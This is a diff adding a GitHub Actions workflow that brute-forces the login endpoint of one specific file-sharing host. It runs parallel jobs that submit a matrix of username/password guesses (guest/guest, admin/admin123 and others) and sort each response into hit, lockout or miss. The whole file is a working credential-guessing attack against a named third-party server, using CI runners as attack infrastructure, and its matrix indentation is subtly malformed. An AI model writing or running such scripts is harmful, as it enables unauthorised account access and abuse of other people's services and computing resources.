@@ -1,0 +1,32 @@
+name: openlist-brute-test
+on:
+  workflow_dispatch:
+jobs:
+  brute:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 18
+      matrix:
+        include:
+      - user: "guest"
+        pass: "guest"
+      - user: "admin"
+        pass: "admin123"
+      - user: "flim#flam!@x"
+        pass: "pass@word#1"
+    steps:
+      - name: test
+        run: |
+          set +e
+          U="${{ matrix.user }}"; P="${{ matrix.pass }}"
+          BODY=$(curl -skS -m 20 -o /tmp/b.txt -w "%{http_code}" -X POST "https://pan.yazinb.icu/api/auth/login" \
+            -H "Content-Type: application/json" \
+            -d "{\"username\":\"$U\",\"password\":\"$P\"}" 2>/dev/null; cat /tmp/b.txt | head -c 800 | tr -d '\n')
+          if echo "$BODY" | grep -q '"code":200'; then
+            echo "HIT | user=$U pass=$P | body=$BODY"
+          elif echo "$BODY" | grep -qi 'too many\|attempts\|locked\|limit'; then
+            echo "LOCK | user=$U pass=$P | body=$BODY"
+          else
+            echo "MISS | user=$U pass=$P | body=$BODY"
+          fi
